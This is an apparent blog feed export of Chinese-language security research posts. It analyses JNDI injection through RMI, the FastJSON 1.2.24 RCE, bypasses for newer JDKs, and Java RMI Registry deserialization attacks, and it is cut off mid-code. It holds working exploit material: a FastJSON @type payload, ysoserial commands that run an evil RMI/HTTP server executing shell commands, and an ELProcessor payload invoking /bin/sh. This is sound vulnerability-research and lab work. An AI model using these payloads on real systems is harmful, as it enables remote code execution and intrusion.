class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javac EvilObj.java</code>生成EvilObj.class，然后挂载到一个web服务上就可以了。可以直接选择python来挂载</p><p>那么我们来具体看一下lookup函数具体做了什么</p><p>首先InitialContext的lookup函数，会根据提供的URL自动选择合适的InitialContext（分离出协议后进行选择），比如此时的InitialContext为rmiURLContext</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204203703902-1255889.png" alt="image-20200204203703902"></p><p>继续跟进<code>com/sun/jndi/toolkit/url/GenericURLContext.java#lookup</code></p><p><img src="/images/jndi-with-rmi-20200209/image-20200204204303412-1255889.png" alt="image-20200204204303412"></p><p>这里的ctx为RegistryContext，将对指定的RMI Registry获取绑定的obj</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204204444118-1255889.png" alt="image-20200204204444118"></p><p>获取到远程对象，并调用decodeObject函数</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204205121493-1255889.png" alt="image-20200204205121493"></p><p>如果当前的remote对象是RemoteReference类型，则进一步请求Registry获取该Reference的内容。到这里为止，我们接下来的请求就同Server端的关系不大了，Client会根据拿到的Reference请求相应的服务器</p><p>继续跟进getObjectInstance</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204205638427-1255889.png" alt="image-20200204205638427"></p><p>这里会继续调用NamingManager的getObjectFactoryFromReference，该函数完成了向FactoryURL请求具体的class文件的功能。</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204210107747-1255889.png" alt="image-20200204210107747"></p><p>这里可以看到，根据factoryName和codebase将远程载入相应的class文件(这里的loadClass用的URLClassLoader来完成任务)</p><p><img src="/images/jndi-with-rmi-20200209/image-20200204210025714-1255889.png" alt="image-20200204210025714"></p><p>并在第163行对载入的obj进行初始化，这也就是为什么我们需要把payload写在构造函数里。</p><p>在利用中，lookup函数的参数必须是可控的，或者利用反序列化利用链的方式来完成，比如下面的两个案例</p><h3 id="案例一：Spring框架的JtaTransactionManager类"><a href="#案例一：Spring框架的JtaTransactionManager类" class="headerlink" title="案例一：Spring框架的JtaTransactionManager类"></a>案例一：Spring框架的JtaTransactionManager类</h3><p>16年的时候Spring框架暴了一个反序列化的可利用点JtaTransactionManager，其原理就是利用了JNDI 可控的lookup参数（这里的可控由反序列化来完成）。来看一下原理</p><p><code>org/springframework/transaction/jta/JtaTransactionManager.java#readObject</code></p><p><img src="/images/jndi-with-rmi-20200209/image-20200205222725185-1255889.png" alt="image-20200205222725185"></p><p>这里1230行初始化了一个jdni的context，这个context将用于后续的JNDI lookup</p><p>继续跟进initUserTransactionAndTranscationManager</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205222908751-1255889.png" alt="image-20200205222908751"></p><p>继续跟进lookupUserTransaction</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205223002181-1255889.png" alt="image-20200205223002181"></p><p>这里最终调用了context的lookup函数，并且其参数为userTransactionName，这个部分我们可以在序列化前进行构造，例如下面的代码(更新在了ysoserial的spring3上)</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205223116317-1255889.png" alt="image-20200205223116317"></p><p>到了如今2020年，这个类的利用仍然存在于最新版的Spring-tx组件上XD</p><h3 id="案例二：FastJSON反序列化POC-JdbcRowSetImpl类"><a href="#案例二：FastJSON反序列化POC-JdbcRowSetImpl类" class="headerlink" title="案例二：FastJSON反序列化POC JdbcRowSetImpl类"></a>案例二：FastJSON反序列化POC JdbcRowSetImpl类</h3><p>fastjson由于<code>@type</code>的存在，在受影响的版本中，其可以对任意指定的对象进行反序列化，根据规则自动调用setter/getter来达到实例还原的目的。首先来看一下POC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/obj"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>这里的关键在于autoCommit，来看一下JdbcRowSetImpl的setAutoCommit函数</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205125555341-1255889.png" alt="image-20200205125555341"></p><p>这里如果conn为null的话，会调用connect函数，看一下connect函数</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205125714780-1255889.png" alt="image-20200205125714780"></p><p>看到这里用JNDI进行数据库连接，并且由于fastjson的特性dataSource是可控的，这就意味着我们可以控制lookup的参数，并向恶意的server发起JNDI连接。根据前文说的原理，我们可以使得主机执行任意代码。</p><h2 id="0x03-环境复现"><a href="#0x03-环境复现" class="headerlink" title="0x03 环境复现"></a>0x03 环境复现</h2><h3 id="改造JRMPListener"><a href="#改造JRMPListener" class="headerlink" title="改造JRMPListener"></a>改造JRMPListener</h3><p>由于JNDI底层用的都是RMI的东西，所以我们要建立一个绑定了Reference的RMI服务，可以直接改改JRMPListener。</p><p>在RMI部分曾经分析过JRMPListener，其返回了ExceptionalReturn，使得构造好的Exception在Client反序列化执行命令。而对于绑定Reference，我们需要修改ExceptionalReturn为NormalReturn并将payloadObject改为ReferenceWrapper</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205154116235-1255889.png" alt="image-20200205154116235"></p><p>payloadObject改为ReferenceWrapper</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205154412920-1255889.png" alt="image-20200205154412920"></p><p>但是在实际测试时，发现Client请求后不能完全退出。其实我们也可以直接用上面的例子</p><p><img src="/images/jndi-with-rmi-20200209/image-20200205155851653-1255889.png" alt="image-20200205155851653"></p><p>不过这里就获取不到是否有访问进来，根据实际的环境取舍吧XD</p><p>改造后的已更新到<a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">github</a>上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 开启挂载了evil class文件的HTTP Server</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br><span class="line"></span><br><span class="line">// 开启RMI Reference Listener</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/</span><br><span class="line"></span><br><span class="line">// 或者使用RMIRefListener2，集合了上面两个步骤</span><br><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj <span class="string">"open /System/Applications/Calculator.app"</span></span><br></pre></td></tr></table></figure><h3 id="FastJSON-1-2-24-RCE"><a href="#FastJSON-1-2-24-RCE" class="headerlink" title="FastJSON 1.2.24 RCE"></a>FastJSON 1.2.24 RCE</h3><p>这里我们以FastJSON 1.2.24版本的RCE为例，来试验JNDI</p><p>首先开启一个evil rmi server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj <span class="string">"touch /tmp/success"</span></span><br></pre></td></tr></table></figure><p>用<a href="https://github.com/vulhub/vulhub/blob/master/fastjson/1.2.24-rce/README.md" target="_blank" rel="noopener">vulhub</a>的环境</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144653206-1255889.png" alt="image-20200206144653206"></p><p>在服务器端会接收到连接</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144749240-1255889.png" alt="image-20200206144749240"></p><p>进到docker里可以看到生成了success文件</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206144824977-1255889.png" alt="image-20200206144824977"></p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>前文用的环境是JDK8u111，在后续的JDK8u113以及JDK6u132, JDK7u122之后增加了对远程codebase的限制</p><blockquote><p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启 RMI Registry 或者 COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。</p><p>Changelog:</p><ul><li>JDK 6u141 <a href="http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141</a></li><li>JDK 7u131 <a href="http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html</a></li><li>JDK 8u121 <a href="http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html</a></li></ul><p>摘自<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p></blockquote><p>那么如果存在这样一个漏洞但是又是高版本的JDK环境，该怎么进行bypass呢？</p><blockquote><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li></ol><p>摘自<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p></blockquote><p>上面的这篇文章提出了上面两种方案来进行。</p><h3 id="利用底层协议实现上的漏洞"><a href="#利用底层协议实现上的漏洞" class="headerlink" title="利用底层协议实现上的漏洞"></a>利用底层协议实现上的漏洞</h3><p>先来说一下第二种，这里提到利用的是LDAP，这部分我们后面再详细叙述，其实原理跟RMI的反序列化问题是一样的。</p><p>我在<a href="http://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/">浅谈Java RMI反序列化问题</a>中曾提到过，JRMPListener利用的是RMI Client在接收Exception时发生的反序列化漏洞。而这里的JNDI底层用的仍然是RMI那套(如果协议是RMI的话)，所以我们发起一个链接到ysoserial的JRMPListener也还是能成功利用的，不管有没有设置<code>com.sun.jndi.rmi.object.trustURLCodebase</code>为true。当然如果要利用成功，发起端必须要有反序列化利用链所依赖的组件并且合适的JDK版本才可以。</p><h3 id="利用可利用的本地Factory对象"><a href="#利用可利用的本地Factory对象" class="headerlink" title="利用可利用的本地Factory对象"></a>利用可利用的本地Factory对象</h3><p>然后我们来继续看看第一种情况</p><p>在前面分析NamingManager的getObjectFactoryFromReference时，我略过了本地的factory的载入部分的代码</p><p><img src="/images/jndi-with-rmi-20200209/image-20200206163723977-1255889.png" alt="image-20200206163723977"></p><p>这里首先会在本地的CLASSPATH里找这个factoryName，如果找到了，后续就不用进行远程加载。所以如果本地可以找到一个可利用的factory，也能突破JNDI的远程加载的限制。</p><p>前面的文章中提到了tomcat（或glassfish）中的BeanFactory的利用，来分析一下</p><p>首先在后续的调用中，factory的getObjectInstance函数将会被调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref 为我们传入的Reference 可控</span></span><br><span class="line"><span class="comment">// name 为factory的name，这里就是我们自己伪造的*EvilObj* 可控</span></span><br><span class="line">factory.getObjectInstance(ref, name, nameCtx, environment);</span><br></pre></td></tr></table></figure><p>来看一下BeanFactory中getObjectInstance函数的实现，函数有点长，我们挑重点看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                Reference ref = (Reference) obj;</span><br><span class="line">                String beanClassName = ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="keyword">null</span>;</span><br><span class="line">                ClassLoader tcl =</span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);<span class="comment">// 载入指定class</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);<span class="comment">// 载入指定class</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                Object bean = beanClass.newInstance();<span class="comment">// 实例化</span></span><br></pre></td></tr></table></figure><p>先看这部分代码，当前我们传入的Reference必须是ResourceRef对象，并在后续加载ResourceRef的beanClass和shilihuanewInstance进行(而这里的class我们可以在赋值时随意指定)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">RefAddr ra = ref.get(<span class="string">"forceString"</span>);</span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">String value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Items are given as comma separated list */</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">","</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line"></span><br><span class="line">        index = param.indexOf(<span class="string">'='</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;<span class="comment">// 如果内容中存在=，提取=后面的字符串作为函数名</span></span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">"set"</span> +</span><br><span class="line">                         param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                         param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            forced.put(param,</span><br><span class="line">                       beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">        &#125; <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ReferenceRef存在着可控的键值对关系，通过<code>get</code>函数获得，如上述代码<code>ref.get(&quot;forceString&quot;)</code>将会获得forceString相对应的RefAddr，通过调用RefAddr的getContent函数就可以获得forceString键对应的值。</p><p>这里需要注意的是，当forceString对应的内容中存在<code>=</code>时，将截取<code>=</code>后面的字符串作为后续调用的函数名。这意味着我们可以任意指定当前对象的类函数了。force键值对中将包含<code>=</code>前面的内容和相应的Method对象。例如<code>test=eval</code>,最终我们将得到eval的Method对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line"></span><br><span class="line">    ra = e.nextElement();</span><br><span class="line">    String propName = ra.getType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">        propName.equals(<span class="string">"scope"</span>) || propName.equals(<span class="string">"auth"</span>) ||</span><br><span class="line">        propName.equals(<span class="string">"forceString"</span>) ||</span><br><span class="line">        propName.equals(<span class="string">"singleton"</span>)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Shortcut for properties with explicitly configured setter */</span></span><br><span class="line">    Method method = forced.get(propName);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException|</span><br><span class="line">                 IllegalArgumentException|</span><br><span class="line">                 InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NamingException</span><br><span class="line">                (<span class="string">"Forced String setter "</span> + method.getName() +</span><br><span class="line">                 <span class="string">" threw exception for property "</span> + propName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>ref.getAll</code>获取了所有的RefAddr，对于非<code>Constants.FACTORY/scope/auth/forceString/singleton</code>且前文又获取相应的Method对象时，我们将调用该对象，其函数参数为此时RefAddr的内容。比如存在一个RefAddr的type为<code>test</code>，将调用前面的<code>eval</code>的Method对象。</p><p>到这里，我们就完成了一次反射调用，来看看poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload from kingx</span></span><br><span class="line">ResourceRef ref = <span class="keyword">new</span> ResourceRef(</span><br><span class="line">    <span class="string">"javax.el.ELProcessor"</span>,<span class="comment">// bean class</span></span><br><span class="line">    <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>,</span><br><span class="line">    <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="comment">// factory class</span></span><br><span class="line">    <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"KINGX=eval"</span>));<span class="comment">// eval函数Method对象将会被调用</span></span><br><span class="line">ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"KINGX"</span>,</span><br><span class="line">    <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"</span> +</span><br><span class="line">        <span class="string">".newInstance().getEngineByName(\"JavaScript\")"</span> +</span><br><span class="line">        <span class="string">".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']("</span> +</span><br><span class="line">        <span class="string">"['/bin/sh','-c','"</span>+ command +<span class="string">"'])"</span> +</span><br><span class="line">        <span class="string">".start()\")"</span>));<span class="comment">// eval函数的参数为上述执行命令的el语句</span></span><br></pre></td></tr></table></figure><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>前面对JNDI with RMI做了一些简单的介绍，当遇到可控的JNDI lookup函数，我们可以发起JNDI链接到RMI服务上，利用JNDI Naming Manager的远程codebase加载机制载入任意的bytecodes。</p><p>当然，前面的利用方式仅在JDK8u113、JDK6u132,、JDK7u122版本之前，如果遇到了高版本的JDK，我们可以尝试利用本地CLASSPATH中可利用的反序列化利用链，或者是tomcat环境下的可利用的ObjectFactory。</p><p>在后续可利用的本地Factory这个思路上，原文作者kingx提出或许其他的中间件环境也可能存在这种可利用的ObjectFactory，这里立个flag，以后有空了一定要找找XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Java RMI Registry安全问题</title>
      <link href="2020/02/06/java/rmi-registry-security-problem/"/>
      <url>2020/02/06/java/rmi-registry-security-problem/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文讲述了Java RMI Registry相关的反序列化问题，主讲Registry，后续补充了Client端和Server端的利用</p><a id="more"></a><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>Java RMI流程可参考<a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">1</a>，出问题的位置在于：</p><h3 id="情景一：Registry-接收bind-rebind请求"><a href="#情景一：Registry-接收bind-rebind请求" class="headerlink" title="情景一：Registry 接收bind/rebind请求"></a>情景一：Registry 接收bind/rebind请求</h3><p> 从Client接收到的bind或rebind的<code>remote obj</code>，将由<code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code>处理</p><p>（下图为JDK8u141之前的版本的实现）</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317175519024.png" alt="image-20200317175519024"></p><p>可以看到获取到的序列化数据直接调用了readObject函数，导致了常规的Java反序列化漏洞的触发。</p><p>这里我们只需要写一个bind或rebind的操作，即可攻击到RMI Registry。</p><h4 id="注意：bind-rebind请求的限制"><a href="#注意：bind-rebind请求的限制" class="headerlink" title="注意：bind/rebind请求的限制"></a>注意：bind/rebind请求的限制</h4><p>Registry对于bind/rebind的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry会拒绝该请求。</p><p>这里思路是正确的，可以防止外部的恶意绑定，但是他在实现上存在问题。</p><p>JDK 8u141之前，首先会去接收传送过来的对象，并将其进行<code>readObject</code>反序列化，实际判断是否为本地请求，是在put新的绑定对象之前进行的。这意味着在checkAccess之前我们就可以完成反序列化操作，该限制并没有起到相应的作用。</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317175608779.png" alt="image-20200317175608779"></p><p>而在JDK 8u141版本之后，<code>sun/rmi/registry/RegistryImpl_Skel.java#dispatch</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317181813002.png" alt="image-20200317181813002"></p><p>这里会先去判断是否为本地绑定请求，然后再进行反序列化。</p><p>所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前</p><h3 id="情景二：Registry接收lookup请求"><a href="#情景二：Registry接收lookup请求" class="headerlink" title="情景二：Registry接收lookup请求"></a>情景二：Registry接收lookup请求</h3><p>由于bind/rebind请求在141后续版本存在限制，所以为了攻击Registry我们必须找其他的方法。</p><p>在RMI里客户端向Registry发起lookup请求是不限制请求源的，那么lookup是否可以被我们利用呢？</p><p>答案是肯定的，来看<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>对于lookup请求的处理</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512141031125.png" alt="image-20200512141031125"></p><p>可以看到在这里，接收到lookup发送过来的内容时，也是直接对其进行反序列化操作。但是这里并没有bind/rebind的请求源限制，所以我们可以直接lookup发起对141版本之后的registry的攻击。</p><p>我们在构造lookup函数请求时，只需重新实现一下lookup函数的实现就可以了（这里将Naming.lookup和RegistryImpl_Stub.lookup进行了合并，并将传送过去的内容改成了任意的Object对象）。</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512141411217.png" alt="image-20200512141411217"></p><h2 id="0x02-攻击Registry-jdk-lt-8u121"><a href="#0x02-攻击Registry-jdk-lt-8u121" class="headerlink" title="0x02 攻击Registry jdk&lt;8u121"></a>0x02 攻击Registry jdk&lt;8u121</h2><p>环境使用jdk8u111，该版本下的RMI Registry接收的remote obj只要继承了Remote类即可（原理见<a href="https://www.freebuf.com/vuls/126499.html" target="_blank" rel="noopener">2</a>），没有其他的限制。</p><p>ysoserial工具中的<code>ysoserial.exploit.RMIRegisterExploit</code>采用了代理Remote类的方式来解决这个限制。</p><p>使用如下命令即可</p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot;</code></p><h3 id="简单看一下ysoserial-exploit-RMIRegisterExploit的原理"><a href="#简单看一下ysoserial-exploit-RMIRegisterExploit的原理" class="headerlink" title="简单看一下ysoserial.exploit.RMIRegisterExploit的原理"></a>简单看一下ysoserial.exploit.RMIRegisterExploit的原理</h3><p>根据前面文章中的原理，我们传过去的对象必须要是一个继承了java.rmi.Remote接口的对象。这里ysoserial工具则直接利用动态代理的原理，对Remote类做代理，其处理的handler用了CommonsCollections中常用的AnnotationInvocationHandler。但其触发点变为handler的memberValues属性被反序列化所执行的利用链。</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110145154688.png" alt="image-20200110145154688"></p><p>接下来，远程bind对象将构造好的remote对象传过去即可，来看一下这个代码</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110145346319.png" alt="image-20200110145346319"></p><h2 id="0x03-攻击Registry-jdk-lt-8u232-b09"><a href="#0x03-攻击Registry-jdk-lt-8u232-b09" class="headerlink" title="0x03 攻击Registry jdk&lt;8u232_b09"></a>0x03 攻击Registry jdk&lt;8u232_b09</h2><p>jdk8u121修复后的版本里，对反序列化的类做了白名单限制，见<code>sun/rmi/registry/RegistryImpl.java#registryFilter</code></p><p>这个白名单包括：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (String<span class="class">.<span class="keyword">class</span> </span>== clazz</span><br><span class="line">        || java.lang.Number<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">lang</span>.<span class="title">reflect</span>.<span class="title">Proxy</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">UnicastRef</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIClientSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">RMIServerSocketFactory</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">activation</span>.<span class="title">ActivationID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">UID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span 